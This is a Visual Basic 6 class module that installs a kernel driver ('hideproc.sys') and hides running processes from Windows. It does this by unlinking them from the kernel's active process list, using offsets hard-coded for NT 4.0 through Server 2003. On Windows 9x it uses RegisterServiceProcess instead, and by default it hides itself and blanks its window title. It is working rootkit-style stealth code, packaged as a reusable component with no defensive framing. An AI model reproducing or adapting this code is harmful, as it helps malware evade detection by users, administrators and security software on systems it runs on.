VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "cHideProccess"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

Event Error(ByVal m_Error As Long, ByVal s_Error As String)


Private WithEvents cDevice                          As cDeviceDriver
Attribute cDevice.VB_VarHelpID = -1
Private hDevice                                     As Long
Private bInitialized                                As Boolean
Private mLastError                                  As Long

Private pid_offset                                  As Long
Private flink_offset                                As Long


Private Const SERVICE_FILE                          As String = "hideproc.sys"
Private Const SERVICE_NAME                          As String = "hideproc"

Private Const DEVICE_AUTH_GRT                       As Long = &H64
Private Const DEVICE_GRANT_AUTH                     As Long = &H3EA
Private Const DEVICE_INITIALIZE                     As Long = &H3E8
Private Const DEVICE_REM_PID_FROM_CHAIN             As Long = &H3E9
Private Const DEVICE_AUTH_CODE                      As Long = &H5098BE

Private Const DEVICE_ERROR_SUCCESS                  As Long = 0
Private Const DEVICE_ERROR_NOT_INIT                 As Long = 1
Private Const DEVICE_ERROR_ZERO_PID                 As Long = 2
Private Const DEVICE_ERROR_INVALID_PID              As Long = 3
Private Const DEVICE_ERROR_ALEADY_INIT              As Long = 4
Private Const DEVICE_ERROR_NOT_AUTHORIZED           As Long = 5
Private Const DEVICE_ERROR_DEVICE_COMMUNICATING     As Long = 6
Private Const DEVICE_ERROR_OS_NOT_SUPPORTED         As Long = 7

Private Const VER_PLATFORM_WIN32_NT                 As Long = 2
Private Const RSP_SIMPLE_SERVICE                    As Long = 1


Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type


Private Declare Function DeviceIoControl Lib "kernel32.dll" (ByVal hDevice As Long, ByVal dwIoControlCode As Long, ByVal lpInBuffer As Long, ByVal nInBufferSize As Long, ByVal lpOutBuffer As Long, ByVal nOutBufferSize As Long, ByRef lpBytesReturned As Long, ByVal lpOverlapped As Long) As Long
Private Declare Function GetVersionEx Lib "kernel32.dll" Alias "GetVersionExA" (ByRef lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Private Function IsWinNT() As Boolean
    
    Dim osvi                As OSVERSIONINFO
    Dim bOsVersionInfo      As Boolean
    
    
    osvi.dwOSVersionInfoSize = Len(osvi)
    bOsVersionInfo = GetVersionEx(osvi)
    
    IsWinNT = (bOsVersionInfo And (osvi.dwPlatformId = VER_PLATFORM_WIN32_NT))
    
End Function
Private Sub cDevice_Error(ByVal m_Error As e_Errors)
    
    RaiseEvent Error(m_Error, cDevice.GetErrorMessage(m_Error))
    
End Sub


Private Sub Class_Initialize()

    Set cDevice = New cDeviceDriver

    With cDevice
        
        .ErrorNotificationMethod = EVENT_BASED
        .ExtendedHandle = True
        
    End With

End Sub

Public Function Init( _
        Optional ByVal m_WinXP_ResID As Long = 101, _
        Optional ByVal m_Win2000ResID As Long = 102, _
        Optional ByVal m_ResourceType = "custom") As Boolean
    
    
    Dim osvi                As OSVERSIONINFO
    Dim bOsVersionInfo      As Boolean
    
    
    If (bInitialized) Then
    
        mLastError = DEVICE_ERROR_ALEADY_INIT
        Exit Function
        
    End If
    
    With cDevice
    
        .AddDriverInformation 5, 0, m_Win2000ResID      ' windows 2000  (5.0)
        .AddDriverInformation 5, 1, m_WinXP_ResID       ' windows xp    (5.1)
        
    End With
    
    If (Not cDevice.InstallDriverResource(m_Win2000ResID, _
                                          SERVICE_FILE, _
                                          SERVICE_NAME, _
                                          hDevice, , m_ResourceType)) Then
        
        mLastError = DEVICE_ERROR_OS_NOT_SUPPORTED
        Exit Function
        
    End If
    
    If (pvSendCommand(DEVICE_GRANT_AUTH, _
                      DEVICE_AUTH_CODE, _
                      0) <> DEVICE_AUTH_GRT) Then
        
        mLastError = DEVICE_ERROR_NOT_AUTHORIZED
        Exit Function
        
    End If
    
    osvi.dwOSVersionInfoSize = Len(osvi)
    bOsVersionInfo = GetVersionEx(osvi)
    
    If (Not bOsVersionInfo) Then
    
        mLastError = DEVICE_ERROR_OS_NOT_SUPPORTED
        Exit Function
        
    End If
    
    Select Case (osvi.dwPlatformId)
        
        Case VER_PLATFORM_WIN32_NT
            If (osvi.dwMajorVersion = 4 And osvi.dwMinorVersion = 0) Then
                ' Microsoft Windows NT 4.0
                pid_offset = 148
                flink_offset = 152
                
            ElseIf (osvi.dwMajorVersion = 5 And osvi.dwMinorVersion = 0) Then
                ' Microsoft Windows 2000
                pid_offset = 156
                flink_offset = 160
                
            ElseIf (osvi.dwMajorVersion = 5 And osvi.dwMinorVersion = 1) Then
                ' Microsoft Windows XP
                pid_offset = 132
                flink_offset = 136
                
            ElseIf (osvi.dwMajorVersion = 5 And osvi.dwMinorVersion = 2) Then
                ' Microsoft Windows Server 2003
                pid_offset = 132
                flink_offset = 136
            
           'ElseIf (osvi.dwMajorVersion = ? And osvi.dwMinorVersion = ?) Then
                ' Microsoft Windows 2k3 (SP1)
                'pid_offset = 148 (0x094)
                'flink_offset = 152 (0x098)
                
            Else
                
                mLastError = DEVICE_ERROR_OS_NOT_SUPPORTED
                Exit Function
                
            End If
            
        Case Else
        
            mLastError = DEVICE_ERROR_OS_NOT_SUPPORTED
            Exit Function
        
    End Select
    
    If (pvSendCommand(DEVICE_INITIALIZE, _
                      pid_offset, _
                      flink_offset) <> DEVICE_ERROR_SUCCESS) Then
        
        mLastError = DEVICE_ERROR_DEVICE_COMMUNICATING
        Exit Function
        
    End If
    
    mLastError = DEVICE_ERROR_SUCCESS
    bInitialized = True
    Init = True
    
End Function

Private Sub Class_Terminate()
    
    Set cDevice = Nothing
    
End Sub

Private Function pvSendCommand( _
                ByVal m_CommandCode As Long, _
                ByVal m_pParam As Long, _
                ByVal m_sParam As Long) As Long
    
    
    Dim mCmd(1)     As Long
    Dim pCmd        As Long
    Dim mRet        As Long
    Dim mState      As Long
    
    
    mCmd(0) = m_pParam
    mCmd(1) = m_sParam
    pCmd = VarPtr(mCmd(0))
    
    mState = DeviceIoControl(hDevice, _
                             m_CommandCode, _
                             pCmd, 8, _
                             pCmd, 8, _
                             mRet, 0)
    
    pvSendCommand = mRet
    
End Function


Public Function RemoveProcessLink(ByVal pid As Long) As Boolean
    
    If (Not bInitialized) Then
    
        mLastError = DEVICE_ERROR_NOT_INIT
        Exit Function
        
    End If
    
    mLastError = pvSendCommand(DEVICE_REM_PID_FROM_CHAIN, _
                               pid, 0)
                               
    RemoveProcessLink = (mLastError = DEVICE_ERROR_SUCCESS)
    
End Function

Public Function GetLastErrorMessage(Optional ByRef m_LastError As Long) As String
    
    m_LastError = mLastError
    
    Select Case mLastError
    
        Case DEVICE_ERROR_SUCCESS
            GetLastErrorMessage = "Operation completed successfully."
        
        Case DEVICE_ERROR_INVALID_PID
            GetLastErrorMessage = "Invalid process id."
        
        Case DEVICE_ERROR_ZERO_PID
            GetLastErrorMessage = "Zero is a system process id."
    
        Case DEVICE_ERROR_NOT_INIT
            GetLastErrorMessage = "Class has not been initialized."
        
        Case DEVICE_ERROR_NOT_AUTHORIZED
            GetLastErrorMessage = "You are not authorized to use the device driver."
            
        Case DEVICE_ERROR_DEVICE_COMMUNICATING
            GetLastErrorMessage = "An error occured while communicating with the device driver." & _
                                  vbCrLf & "May be you have an unsupported version of windows!"
        
        Case DEVICE_ERROR_OS_NOT_SUPPORTED
            GetLastErrorMessage = "Unsupported version of windows."
        
        Case DEVICE_ERROR_ALEADY_INIT
            GetLastErrorMessage = "Class has already been initialized."
            
        Case Else
            GetLastErrorMessage = "Unknown error number " & Hex(mLastError)
        
    End Select
    
End Function

Public Function MyProcessID() As Long

    MyProcessID = GetCurrentProcessId()
    
End Function

' If pid = -1 then it will hide current process (me!)
Public Function HideProcess(Optional ByVal pid As Long = -1) As Boolean
    
    If (pid = -1) Then
        pid = GetCurrentProcessId()
    End If
    
    App.Title = ""
    
    If (IsWinNT()) Then
        ' Windows NT (NT, 2000, XP, ...)
        HideProcess = (RemoveProcessLink(pid))
        
    Else
        ' Windows 9x/ME (Use old way)
        Call RegisterServiceProcess(pid, _
                                    RSP_SIMPLE_SERVICE)
        HideProcess = True
        
    End If
    
End Function
